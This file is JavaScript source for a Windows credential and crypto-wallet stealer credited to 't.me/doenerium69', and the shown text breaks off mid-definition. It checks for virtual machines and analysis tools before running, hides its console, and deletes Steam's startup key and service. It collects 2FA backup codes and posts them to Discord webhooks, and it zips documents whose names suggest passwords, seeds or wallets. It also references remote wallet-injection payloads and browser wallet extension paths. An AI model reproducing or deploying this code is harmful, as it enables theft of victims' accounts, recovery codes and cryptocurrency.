const fs = require('fs');
const fsPromises = require('fs').promises;
const path = require('path');
const axios = require('axios');
const os = require('os');
const FormData = require('form-data');
const AdmZip = require('adm-zip');
const { execSync, exec } = require('child_process');
const crypto = require('crypto');
const sqlite3 = require('sqlite3');
const util = require('util');
function getLocale() {
    return Intl.DateTimeFormat().resolvedOptions().locale.slice(0, 2).toUpperCase();
}
const computerName = os.hostname();
const local = process.env.LOCALAPPDATA;
const discords = [];
const locale = getLocale();
const mainFolderPath = `C:/ProgramData/Steam/Launcher/${locale}-${computerName}`;
var appdata = process.env.APPDATA, LOCAL = process.env.LOCALAPPDATA, localappdata = process.env.LOCALAPPDATA;
const keywords = ["gmail.com", "live.com", "impots.gouv.fr", "zoho.com", "ameli.fr", "yahoo.com", "tutanota.com", "uber.com", "trashmail.com", "gmx.net", "github.com", "ubereats.com", "safe-mail.net", "thunderbird.net", "mail.lycos.com", "hushmail.com", "mail.aol.com", "icloud.com", "protonmail.com", "fastmail.com", "rackspace.com", "1and1.com", "mailbox.org", "mail.yandex.com", "titan.email", "youtube.com", "nulled.to", "cracked.to", "tiktok.com", "yahoo.com", "gmx.com", "aol.com", "coinbase", "mail.ru", "rambler.ru", "gamesense.pub", "neverlose.cc", "onetap.com", "fatality.win", "vape.gg", "binance", "ogu.gg", "lolz.guru", "xss.is", "g2g.com", "igvault.com", "plati.ru", "minecraft.net", "primordial.dev", "vacban.wtf", "instagram.com", "mail.ee", "hotmail.com", "facebook.com", "vk.ru", "x.synapse.to", "hu2.app", "shoppy.gg", "app.sell", "sellix.io", "gmx.de", "riotgames.com", "mega.nz", "roblox.com", "exploit.in", "breached.to", "v3rmillion.net", "hackforums.net", "0x00sec.org", "unknowncheats.me", "godaddy.com", "accounts.google.com", "aternos.org", "namecheap.com", "hostinger.com", "bluehost.com", "hostgator.com", "siteground.com", "netafraz.com", "iranserver.com", "ionos.com", "whois.com", "te.eg", "vultr.com", "mizbanfa.net", "neti.ee", "osta.ee", "cafe24.com", "wpengine.com", "parspack.com", "cloudways.com", "inmotionhosting.com", "hinet.net", "mihanwebhost.com", "mojang.com", "phoenixnap.com", "dreamhost.com", "rackspace.com", "name.com", "alibabacloud.com", "a2hosting.com", "contabo.com", "xinnet.com", "7ho.st", "hetzner.com", "domain.com", "west.cn", "iranhost.com", "yisu.com", "ovhcloud.com", "000webhost.com", "reg.ru", "lws.fr", "home.pl", "sakura.ne.jp", "matbao.net", "scalacube.com", "telia.ee", "estoxy.com", "zone.ee", "veebimajutus.ee", "beehosting.pro", "core.eu", "wavecom.ee", "iphoster.net", "cspacehostings.com", "zap-hosting.com", "iceline.com", "zaphosting.com", "cubes.com", "chimpanzeehost.com", "fatalityservers.com", "craftandsurvive.com", "mcprohosting.com", "shockbyte.com", "ggservers.com", "scalacube.com", "apexminecrafthosting.com", "nodecraft.com", "sparkedhost.com", "pebblehost.com", "ramshard.com", "linkvertise.com", "adf.ly", "spotify.com", "tv3play.ee", "clarity.tk", "messenger.com", "snapchat.com", "boltfood.eu", "stuudium.com", "steamcommunity.com", "epicgames.com", "greysec.net", "twitter.com", "reddit.com", "amazon.com", "redengine.eu", "eulencheats.com", "4netplayers.com", "velia.net", "bybit.com", "coinbase.com", "ftx.com", "ftx.us", "binance.us", "bitfinex.com", "kraken.com", "bitstamp.net", "bittrex.com", "kucoin.com", "cex.io", "gemini.com", "blockfi.com", "nexo.io", "nordvpn.com", "surfshark.com", "privateinternetaccess.com", "netflix.com", "astolfo.lgbt", "intent.store", "novoline.wtf", "flux.today", "moonx.gg", "novoline.lol", "twitch.tv"];
const atomicInjectionUrl = "https://github.com/doenerium6969/wallet-injection/raw/main/atomic.asar";
const exodusInjectionUrl = "https://github.com/doenerium6969/wallet-injection/raw/main/exodus.asar";


const botToken = 'YOURBOTTOKEN';
const chatId = 'YOURCHATID';
const discordWebhookUrl = 'REMPLACE_ME';


const blackListedIPS = ["88.132.231.71", "212.119.227.165", "52.251.116.35", "194.154.78.69", "194.154.78.137", "213.33.190.219", "78.139.8.50", "20.99.160.173", "88.153.199.169", "84.147.62.12", "194.154.78.160", "92.211.109.160", "195.74.76.222", "188.105.91.116", "34.105.183.68", "92.211.55.199", "79.104.209.33", "95.25.204.90", "34.145.89.174", "109.74.154.90", "109.145.173.169", "34.141.146.114", "212.119.227.151", "195.239.51.59", "192.40.57.234", "64.124.12.162", "34.142.74.220", "188.105.91.173", "109.74.154.91", "34.105.72.241", "109.74.154.92", "213.33.142.50", ];
const blackListedHostname = ["BEE7370C-8C0C-4", "AppOnFly-VPS","tVaUeNrRraoKwa", "vboxuser", "fv-az269-80", "DESKTOP-Z7LUJHJ", "DESKTOP-0HHYPKQ", "DESKTOP-TUAHF5I",  "DESKTOP-NAKFFMT", "WIN-5E07COS9ALR", "B30F0242-1C6A-4", "DESKTOP-VRSQLAG", "Q9IATRKPRH", "XC64ZB", "DESKTOP-D019GDM", "DESKTOP-WI8CLET", "SERVER1", "LISA-PC", "JOHN-PC", "DESKTOP-B0T93D6", "DESKTOP-1PYKP29", "DESKTOP-1Y2433R", "WILEYPC", "WORK", "6C4E733F-C2D9-4", "RALPHS-PC", "DESKTOP-WG3MYJS", "DESKTOP-7XC6GEZ", "DESKTOP-5OV9S0O", "QarZhrdBpj", "ORELEEPC", "ARCHIBALDPC", "JULIA-PC", "d1bnJkfVlH", ]
const blackListedUsername = ["WDAGUtilityAccount", "runneradmin", "Abby", "Peter Wilson", "hmarc", "patex", "aAYRAp7xfuo", "JOHN-PC", "FX7767MOR6Q6", "DCVDY", "RDhJ0CNFevzX", "kEecfMwgj", "Frank", "8Nl0ColNQ5bq", "Lisa", "John", "vboxuser", "george", "PxmdUOpVyx", "8VizSM", "w0fjuOVmCcP5A", "lmVwjj9b", "PqONjHVwexsS", "3u2v9m8", "lbeld", "od8m", "Julia", "HEUeRzl", ]
const blackListedGPU = ["Microsoft Remote Display Adapter", "Microsoft Hyper-V Video", "Microsoft Basic Display Adapter", "VMware SVGA 3D", "Standard VGA Graphics Adapter", "NVIDIA GeForce 840M", "NVIDIA GeForce 9400M", "UKBEHH_S", "ASPEED Graphics Family(WDDM)", "H_EDEUEK", "VirtualBox Graphics Adapter", "K9SC88UK", "Стандартный VGA графический адаптер", ]
const blacklistedOS = ["Windows Server 2022 Datacenter", "Windows Server 2019 Standard", "Windows Server 2019 Datacenter", "Windows Server 2016 Standard", "Windows Server 2016 Datacenter"]
const blackListedProcesses = ["watcher.exe", "mitmdump.exe", "mitmproxy.exe", "mitmweb.exe", "Insomnia.exe", "HTTP Toolkit.exe", "Charles.exe", "Postman.exe", "BurpSuiteCommunity.exe", "Fiddler Everywhere.exe", "Fiddler.WebUi.exe", "HTTPDebuggerUI.exe", "HTTPDebuggerSvc.exe", "HTTPDebuggerPro.exe", "x64dbg.exe", "Ida.exe", "Ida64.exe", "Progress Telerik Fiddler Web Debugger.exe", "HTTP Debugger Pro.exe", "Fiddler.exe", "KsDumperClient.exe", "KsDumper.exe", "FolderChangesView.exe", "BinaryNinja.exe", "Cheat Engine 6.8.exe", "Cheat Engine 6.9.exe", "Cheat Engine 7.0.exe", "Cheat Engine 7.1.exe", "Cheat Engine 7.2.exe", "OllyDbg.exe", "Wireshark.exe",];

function checkListed(arr, value) {
    return arr.includes(value);
}

function executeCommand(command, callback) {
    exec(command, (error, stdout, stderr) => {
        callback(stdout.trim());
    });
}


function ipcheck(callback) {
    executeCommand('curl http://api.ipify.org/ --ssl-no-revoke', (stdout) => {
        if (checkListed(blackListedIPS, stdout)) {
            exitProcess();
        } else {
            usernamecheck(callback);
        }
    });
}

function usernamecheck(callback) {
    const userName = process.env['USERPROFILE'].split(path.sep)[2];
    if (checkListed(blackListedUsername, userName)) {
        exitProcess();
    } else {
        hostnamecheck(callback);
    }
}

function hostnamecheck(callback) {
    const hostName = os.hostname();
    if (checkListed(blackListedHostname, hostName)) {
        exitProcess();
    } else {
        bioscheck(callback);
    }
}

function bioscheck(callback) {
    executeCommand('wmic bios get smbiosbiosversion', (stdout) => {
        if (stdout.includes("Hyper-V")) {
            exitProcess();
        } else {
            speedcheck(callback);
        }
    });
}

function checkAndExecute() {
    getPCSerialNumber((serialNumber) => {
        const disks = serialNumber.split('\n');

        for (const disk of disks) {
            if (disk.trim().startsWith("vb") || disk.trim().startsWith("vm")) {
                exitProcess();
                return;
            }
        }
        console.log("No disk starting with 'vb' or 'vm' found.");
    });
}

function getPCSerialNumber(callback) {
    exec('wmic diskdrive get serialnumber', (error, stdout, stderr) => {
        if (error) {
            console.error(`Error executing command: ${error.message}`);
            return;
        }
        if (stderr) {
            console.error(`Error: ${stderr}`);
            return;
        }
        callback(stdout);
    });
}

function processCheck(callback) {
    executeCommand('tasklist /fo csv', (stdout) => {
        const processes = stdout.split('\r\n').map(line => {
            const cols = line.split('","');
            return cols[0].replace('"', '');
        });

        for (const processName of blackListedProcesses) {
            if (processes.includes(processName)) {
                exitProcess();
                return;
            }
        }

        callback();
    });
}

function speedcheck(callback) {
    executeCommand('wmic MemoryChip get /format:list | find /i "Speed"', (stdout) => {
        if (stdout.includes("Speed=0")) {
            exitProcess();
        } else {
            gpucheck(callback);
        }
    });
}

function gpucheck(callback) {
    executeCommand('wmic path win32_VideoController get name', (stdout) => {
        const gpuList = stdout.split(",").map(gpu => gpu.trim());
        if (checkListed(blackListedGPU, gpuList)) {
            exitProcess();
        } else {
            if (gpuList.some(gpu => gpu.startsWith("VMware"))) {
                exitProcess();
            } else {
                oscheck(callback);
            }
        }
    });
}


function oscheck(callback) {
    executeCommand("powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion' -Name ProductName", (stdout) => {
        const osp = stdout.trim();
        if (checkListed(blacklistedOS, osp)) {
            exitProcess();
        } else {
            ramcheck(callback);
        }
    });
}

function ramcheck(callback) {
    const totalRAM = os.totalmem();
    if (totalRAM > 1200) {
        ipcheck(callback);
    } else {
        console.log("");
    }
}

function exitProcess() {
    execSync("powershell wininit.exe")
    process.exit(0);
}

function hideSelf() {

    let powershellScript = `
    Add-Type -Name Window -Namespace Console -MemberDefinition '
    [DllImport("Kernel32.dll")]
    public static extern IntPtr GetConsoleWindow();

    [DllImport("user32.dll")]
    public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
    '

    $consolePtr = [Console.Window]::GetConsoleWindow()
    #0 hide
    [Console.Window]::ShowWindow($consolePtr, 0)
    `;

    let workingDir = process.cwd();
    let tempfile = `${workingDir}\\temp.ps1`;
    fs.writeFileSync(tempfile, powershellScript);

    //a little convoluted to get around powershell script execution policy (might be disabled)
    require('child_process').execSync(`type .\\temp.ps1 | powershell.exe -noprofile -`, {stdio: 'inherit'});
    fs.unlinkSync(tempfile); //delete temp file
}


const foldersToSearch = [
  'Videos',
  'Desktop',
  'Documents',
  'Downloads',
  'Pictures',
  path.join('AppData', 'Roaming', 'Microsoft', 'Windows', 'Recent')
];
paths = [
    appdata + '\\discord\\',
    appdata + '\\discordcanary\\',
    appdata + '\\discordptb\\',
    appdata + '\\discorddevelopment\\',
    appdata + '\\lightcord\\',
    localappdata + '\\Google\\Chrome\\User Data\\Default\\',
    localappdata + '\\Google\\Chrome\\User Data\\Profile 1\\',
    localappdata + '\\Google\\Chrome\\User Data\\Profile 2\\',
    localappdata + '\\Google\\Chrome\\User Data\\Profile 3\\',
    localappdata + '\\Google\\Chrome\\User Data\\Profile 4\\',
    localappdata + '\\Google\\Chrome\\User Data\\Profile 5\\',
    localappdata + '\\Google\\Chrome\\User Data\\Guest Profile\\',
    localappdata + '\\Google\\Chrome\\User Data\\Default\\Network\\',
    localappdata + '\\Google\\Chrome\\User Data\\Profile 1\\Network\\',
    localappdata + '\\Google\\Chrome\\User Data\\Profile 2\\Network\\',
    localappdata + '\\Google\\Chrome\\User Data\\Profile 3\\Network\\',
    localappdata + '\\Google\\Chrome\\User Data\\Profile 4\\Network\\',
    localappdata + '\\Google\\Chrome\\User Data\\Profile 5\\Network\\',
    localappdata + '\\Google\\Chrome\\User Data\\Guest Profile\\Network\\',
    appdata + '\\Opera Software\\Opera Stable\\',
    appdata + '\\Opera Software\\Opera GX Stable\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 1\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 2\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 3\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 4\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 5\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Guest Profile\\',
    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 1\\',
    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 2\\',
    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 3\\',
    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 4\\',
    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 5\\',
    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Guest Profile\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Default\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Profile 1\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Profile 2\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Profile 3\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Profile 4\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Profile 5\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Guest Profile\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Network\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 1\\Network\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 2\\Network\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 3\\Network\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 4\\Network\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 5\\Network\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Guest Profile\\Network\\',
    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 1\\Network\\',
    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 2\\Network\\',
    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 3\\Network\\',
    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 4\\Network\\',
    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 5\\Network\\',
    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Guest Profile\\Network\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Default\\Network\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Profile 1\\Network\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Profile 2\\Network\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Profile 3\\Network\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Profile 4\\Network\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Profile 5\\Network\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Guest Profile\\Network\\'
];

function onlyUnique(item, index, array) {
    return array.indexOf(item) === index;
}

const registryPath = 'HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run';
const keyName = 'Steam';

function removeRegistryKey() {
    const command = `reg delete "${registryPath}" /v ${keyName} /f`;

    exec(command, (error, stdout, stderr) => {
        if (error) {
            const errorMessage = `Error while deleting registry key: ${error.message}`;
            console.error(errorMessage);
            return;
        }

        if (stderr) {
            const errorMessage = `CMD Error: ${stderr}`;
            console.error(errorMessage);
            return;
        }

        // Check if the key was successfully deleted
        if (stdout.includes('The system was unable to find the specified registry key or value.')) {
            console.log(`Registry key "${keyName}" did not exist.`);
        } else {
            console.log(`Registry key "${keyName}" successfully deleted.`);
            // Fully disable Steam Client Service
            exec('sc config "Steam Client Service" start=disabled', (error, stdout, stderr) => {
                if (error) {
                    console.error(`Error while disabling service: ${error.message}`);
                    return;
                }

                if (stderr) {
                    console.error(`CMD Error: ${stderr}`);
                    return;
                }

                console.log(`Steam Client Service disabled: ${stdout}`);

                // Delete Steam Client Service
                exec('sc delete "Steam Client Service"', (error, stdout, stderr) => {
                    if (error) {
                        console.error(`Error while deleting service: ${error.message}`);
                        return;
                    }

                    if (stderr) {
                        console.error(`CMD Error: ${stderr}`);
                        return;
                    }

                    console.log(`Steam Client Service deleted: ${stdout}`);
                });
            });
        }
    });
}

/* basic startup
function addRegistryKey() {
  const programPath = app.getPath('exe');
  const addCommand = `reg add "${registryPath}" /v ${keyName} /t REG_SZ /d "${programPath}" /f`;

  exec(addCommand, (error, stdout, stderr) => {
    if (error) {
      const errorMessage = `Error adding registry key: ${error.message}`;
      console.error(errorMessage);
      return;
    }

    if (stderr) {
      const errorMessage = `CMD error: ${stderr}`;
      console.error(errorMessage);
      return;
    }

    console.log(`Registry key added successfully: ${stdout}`);
  });
}
*/

function sendSuccessToWebhook() {i
  console.log('Sending success to webhook');
}

async function findBackupCodes() {
  for (const searchFolder of foldersToSearch) {
    try {
      const folderPath = path.join(os.homedir(), searchFolder);
      const files = fs.readdirSync(folderPath);

      for (const currentFile of files) {
        if (currentFile === 'discord_backup_codes.txt') {
          const sourceFilePath = path.join(folderPath, currentFile);
          const destinationFilePath = path.join(mainFolderPath, currentFile);

          try {
            await fs.promises.copyFile(sourceFilePath, destinationFilePath);
            console.log(`Backup codes file copied to: ${destinationFilePath}`);

            const embed = {
              title: '',
              color: 0x303037,
              author: {
                name: "Discord backup codes found",
                icon_url: "https://cdn.discordapp.com/attachments/660885288079589385/1190759106907226112/discord-logo-icon-editorial-free-vector_1.png"
              },
              description: `\`\`\`${destinationFilePath}\n\n${fs.readFileSync(destinationFilePath, 'utf-8')}\`\`\``,
              footer: {
                text: `${user.hostname} | @WallGod69 | t.me/doenerium69`,
                icon_url: 'https://images-ext-1.discordapp.net/external/j13wOpj4IOzsnGWzfZFrNsUn7KgMCVWH0OBylRYcIWg/https/images-ext-1.discordapp.net/external/XF_zctmsx1ZUspqbqhZfSm91qIlNvdtEVMkl7uISZD8/%253Fsize%253D96%2526quality%253Dlossless/https/cdn.discordapp.com/emojis/948405394433253416.webp',
              },
            };

            const payload = {
              embeds: [embed],
            };

            try {
              await axios.post(discordWebhookUrl, payload);
              await axios.post(discordWebhookUr1, payload)
              console.log('Backup codes embed sent to Discord');
            } catch (error) {
              console.error(`Error sending webhook: ${error.message}`);
            }
          } catch (error) {
            console.error(`Error copying file: ${error.message}`);
          }
        }
      }
    } catch (err) {
      console.error(`Error reading folder ${searchFolder}: ${err.message}`);
    }
  }
}

async function findEpicGamesBackupCodes() {
  const epicGamesBackupFileName = 'Epic Games Account Two-Factor backup codes.txt';

  for (const searchFolder of foldersToSearch) {
    try {
      const folderPath = path.join(os.homedir(), searchFolder);
      const files = fs.readdirSync(folderPath);

      for (const currentFile of files) {
        if (currentFile === epicGamesBackupFileName) {
          const sourceFilePath = path.join(folderPath, currentFile);
          const destinationFilePath = path.join(mainFolderPath, currentFile);

          try {
            await fs.promises.copyFile(sourceFilePath, destinationFilePath);
            console.log(`Epic Games Backup codes file copied to: ${destinationFilePath}`);

            const embed = {
              title: '',
              color: 0x303037,
              author: {
                name: "Epic Games Backup codes found",
                icon_url: "https://cdn.discordapp.com/attachments/660885288079589385/1206880939624370277/epic-games-icon-2048x2048-tyfxpnys.png?ex=65dd9e76&is=65cb2976&hm=0fbcc1c2929db9fa85e2e0a9844a74b22bf59c063b3fc8ed55b9bca6c6484c74&"
              },
              description: `\`\`\`${destinationFilePath}\n\n${fs.readFileSync(destinationFilePath, 'utf-8')}\`\`\``,
              footer: {
                text: `${user.hostname} | @WallGod69 | t.me/doenerium69`,
                icon_url: 'https://images-ext-1.discordapp.net/external/j13wOpj4IOzsnGWzfZFrNsUn7KgMCVWH0OBylRYcIWg/https/images-ext-1.discordapp.net/external/XF_zctmsx1ZUspqbqhZfSm91qIlNvdtEVMkl7uISZD8/%253Fsize%253D96%2526quality%253Dlossless/https/cdn.discordapp.com/emojis/948405394433253416.webp',
              },
            };

            const payload = {
              embeds: [embed],
            };

            try {
              await axios.post(discordWebhookUrl, payload);
              await axios.post(discordWebhookUr1, payload);
              console.log('Epic Games Backup codes embed sent to Discord');
            } catch (error) {
              console.error(`Error sending webhook: ${error.message}`);
            }
          } catch (error) {
            console.error(`Error copying file: ${error.message}`);
          }
        }
      }
    } catch (err) {
      console.error(`Error reading folder ${searchFolder}: ${err.message}`);
    }
  }
}


async function findGithubBackupCodes() {
  for (const searchFolder of foldersToSearch) {
    try {
      const folderPath = path.join(os.homedir(), searchFolder);
      const files = fs.readdirSync(folderPath);

      for (const currentFile of files) {
        if (currentFile === 'github-recovery-codes.txt') {
          const sourceFilePath = path.join(folderPath, currentFile);
          const destinationFilePath = path.join(mainFolderPath, currentFile);

          try {
            await fs.promises.copyFile(sourceFilePath, destinationFilePath);
            console.log(`Github Backup codes file copied to: ${destinationFilePath}`);

            const embed = {
              title: '',
              color: 0x303037,
              author: {
                name: "Github backup codes found",
                icon_url: "https://github.githubassets.com/assets/GitHub-Mark-ea2971cee799.png"
              },
              description: `\`\`\`${destinationFilePath}\n\n${fs.readFileSync(destinationFilePath, 'utf-8')}\`\`\``,
              footer: {
                text: `${user.hostname} | @WallGod69 | t.me/doenerium69`,
                icon_url: 'https://images-ext-1.discordapp.net/external/j13wOpj4IOzsnGWzfZFrNsUn7KgMCVWH0OBylRYcIWg/https/images-ext-1.discordapp.net/external/XF_zctmsx1ZUspqbqhZfSm91qIlNvdtEVMkl7uISZD8/%253Fsize%253D96%2526quality%253Dlossless/https/cdn.discordapp.com/emojis/948405394433253416.webp',
              },
            };

            const payload = {
              embeds: [embed],
            };

            try {
              await axios.post(discordWebhookUrl, payload);
              await axios.post(discordWebhookUr1, payload)
              console.log('Backup codes embed sent to Discord');
            } catch (error) {
              console.error(`Error sending webhook: ${error.message}`);
            }
          } catch (error) {
            console.error(`Error copying file: ${error.message}`);
          }
        }
      }
    } catch (err) {
      console.error(`Error reading folder ${searchFolder}: ${err.message}`);
    }
  }
}


const allowedExtensions = [".rdp", ".txt", ".doc", ".docx", ".pdf", ".csv", ".xls", ".xlsx", ".keys", ".ldb", ".log"];
const files = ["secret", "password", "account", "tax", "key", "wallet", "gang", "default", "backup", "passw", "mdp", "motdepasse", "acc", "mot_de_passe", "login", "secret", "bot", "atomic", "account", "acount", "paypal", "banque", "bot", "metamask", "wallet", "crypto", "exodus", "discord", "2fa", "code", "memo", "compte", "token", "backup", "secret", "seed", "mnemonic", "memoric", "private", "key", "passphrase", "pass", "phrase", "steal", "bank", "info", "casino", "prv", "privé", "prive", "telegram", "identifiant", "identifiants", "personnel", "trading", "bitcoin", "sauvegarde", "funds", "recup", "note"];

function stealFiles() {
  try {
    const tempDir = fs.mkdtempSync(path.join(process.env.TEMP || '/tmp', crypto.randomBytes(16).toString('hex')));
    const zip = new AdmZip();

    for (const extension of allowedExtensions) {
      const results = [];

      for (const folder of foldersToSearch) {
        const directory = path.join(process.env.HOME || process.env.USERPROFILE, folder);
        if (fs.existsSync(directory)) {
          const filesInFolder = fs.readdirSync(directory);
          for (const file of filesInFolder) {
            const filePath = path.join(directory, file);
            const fileExtension = path.extname(file).toLowerCase();
            const fileName = path.basename(file, path.extname(file)).toLowerCase();
            const fileStats = fs.statSync(filePath);
            const fileSize = fileStats.size;
            if (fileStats.isFile() &&
                fileExtension === extension &&
                files.some(keyword => fileName.includes(keyword)) &&
                fileSize < 3 * 1024 * 1024) {
              results.push(filePath);
            }
          }
        }
      }

      if (results.length > 0) {
        results.forEach(file => {
          const fileName = path.basename(file);
          const destPath = path.join(tempDir, fileName);
          fs.copyFileSync(file, destPath);
        });
      }
    }

    zip.addLocalFolder(tempDir);
    const zipFilePath = path.join(mainFolderPath, 'stolen_files.zip');
    zip.writeZip(zipFilePath);
    fs.rmSync(tempDir, { recursive: true });
    console.log('Files stolen and compressed successfully.');
  } catch (err) {
    console.error("Error:", err);
  }
}





function sendSuccessToWebhook() {
    const successMessage = '**<--------------------------INJECTION STARTED--------------------------->**';
    axios.post(discordWebhookUrl, {
        content: successMessage,
    }).then(response => {
        console.log('Success message sent to Discord webhook successfully.');
    }).catch(error => {
        console.error('Failed to send success message to Discord webhook:', error.message);
    });
}

function moveFileToFolder(filePath, folderName) {
    const destinationFolder = path.join(mainFolderPath, folderName);
    const destinationPath = path.join(destinationFolder, path.basename(filePath));

    if (!fs.existsSync(destinationFolder)) {
        fs.mkdirSync(destinationFolder);
    }

    fs.renameSync(filePath, destinationPath);
}

const walletLocalPaths = {
    "Bitcoin": path.join(process.env.APPDATA, "Bitcoin", "wallets"),
    "Zcash": path.join(process.env.APPDATA, "Zcash"),
    "Armory": path.join(process.env.APPDATA, "Armory"),
    "Bytecoin": path.join(process.env.APPDATA, "bytecoin"),
    "Jaxx": path.join(process.env.APPDATA, "com.liberty.jaxx", "IndexedDB", "file__0.indexeddb.leveldb"),
    "Exodus": path.join(process.env.APPDATA, "Exodus", "exodus.wallet"),
    "Ethereum": path.join(process.env.APPDATA, "Ethereum", "keystore"),
    "Electrum": path.join(process.env.APPDATA, "Electrum", "wallets"),
    "AtomicWallet": path.join(process.env.APPDATA, "atomic", "Local Storage", "leveldb"),
    "Guarda": path.join(process.env.APPDATA, "Guarda", "Local Storage", "leveldb"),
    "Coinomi": path.join(process.env.APPDATA, "Coinomi", "Coinomi", "wallets"),
};


const _0x9b6227 = {}
_0x9b6227.passwords = 0
_0x9b6227.cookies = 0
_0x9b6227.autofills = 0
_0x9b6227.wallets = 0
const count = _0x9b6227,
user = {
        ram: os.totalmem(),
        version: os.version(),
        uptime: os.uptime,
        homedir: os.homedir(),
        hostname: os.hostname(),
        userInfo: os.userInfo().username,
        type: os.type(),
        arch: os.arch(),
        release: os.release(),
        roaming: process.env.APPDATA,
        local: process.env.LOCALAPPDATA,
        temp: process.env.TEMP,
        countCore: process.env.NUMBER_OF_PROCESSORS,
        sysDrive: process.env.SystemDrive,
        fileLoc: process.cwd(),
        randomUUID: crypto.randomBytes(16).toString('hex'),
        start: Date.now(),
        debug: false,
        copyright: '<================[t.me/doenerium69 ]>================>\n\n',
        url: null,
        locale: locale,
    }
_0x2afdce = {}
const walletPaths = _0x2afdce,
    _0x4ae424 = {}
_0x4ae424.Metamask =
    '\\Local Extension Settings\\nkbihfbeogaeaoehlefnkodbefgpgknn'
_0x4ae424.Coinbase =
    '\\Local Extension Settings\\hnfanknocfeofbddgcijnmhnfnkdnaad'
_0x4ae424.BinanceChain =
    '\\Local Extension Settings\\fhbohimaelbohpjbbldcngcnapndodjp'
_0x4ae424.Phantom =
    '\\Local Extension Settings\\bfnaelmomeimhlpmgjnjophhpkkoljpa'
_0x4ae424.TronLink =
    '\\Local Extension Settings\\ibnejdfjmmkpcnlpebklmnkoeoihofec'
_0x4ae424.Ronin = '\\Local Extension Settings\\fnjhmkhhmkbjkkabndcnnogagogbneec'
_0x4ae424.Exodus =
    '\\Local Extension Settings\\aholpfdialjgjfhomihkjbmgjidlcdno'
_0x4ae424.Coin98 =
    '\\Local Extension Settings\\aeachknmefphepccionboohckonoeemg'
_0x4ae424.Authenticator =
    '\\Sync Extension Settings\\bhghoamapcdpbohphigoooaddinpkbai'
_0x4ae424.MathWallet =
    '\\Sync Extension Settings\\afbcbjpbpfadlkmhmclhkeeodmamcflc'
_0x4ae424.YoroiWallet =
    '\\Local Extension Settings\\ffnbelfdoeiohenkjibnmadjiehjhajb'
_0x4ae424.GuardaWallet =
    '\\Local Extension Settings\\hpglfhgfnhbgpjdenjgmdgoeiappafln'
_0x4ae424.JaxxxLiberty =
    '\\Local Extension Settings\\cjelfplplebdjjenllpjcblmjkfcffne'
_0x4ae424.Wombat =
    '\\Local Extension Settings\\amkmjjmmflddogmhpjloimipbofnfjih'
_0x4ae424.EVERWallet =
    '\\Local Extension Settings\\cgeeodpfagjceefieflmdfphplkenlfk'
_0x4ae424.KardiaChain =
    '\\Local Extension Settings\\pdadjkfkgcafgbceimcpbkalnfnepbnk'
_0x4ae424.XDEFI = '\\Local Extension Settings\\hmeobnfnfcmdkdcmlblgagmfpfboieaf'
_0x4ae424.Nami = '\\Local Extension Settings\\lpfcbjknijpeeillifnkikgncikgfhdo'
_0x4ae424.TerraStation =
    '\\Local Extension Settings\\aiifbnbfobpmeekipheeijimdpnlpgpp'
_0x4ae424.MartianAptos =
    '\\Local Extension Settings\\efbglgofoippbgcjepnhiblaibcnclgk'
_0x4ae424.TON = '\\Local Extension Settings\\nphplpgoakhhjchkkhmiggakijnkhfnd'
_0x4ae424.Keplr = '\\Local Extension Settings\\dmkamcknogkgcdfhhbddcghachkejeap'
_0x4ae424.CryptoCom =
    '\\Local Extension Settings\\hifafgmccdpekplomjjkcfgodnhcellj'
_0x4ae424.PetraAptos =
    '\\Local Extension Settings\\ejjladinnckdgjemekebdpeokbikhfci'
_0x4ae424.OKX = '\\Local Extension Settings\\mcohilncbfahbmgdjkbpemcciiolgcge'
_0x4ae424.Sollet =
    '\\Local Extension Settings\\fhmfendgdocmcbmfikdcogofphimnkno'
_0x4ae424.Sender =
    '\\Local Extension Settings\\epapihdplajcdnnkdeiahlgigofloibg'
_0x4ae424.Sui = '\\Local Extension Settings\\opcgpfmipidbgpenhmajoajpbobppdil'
_0x4ae424.SuietSui =
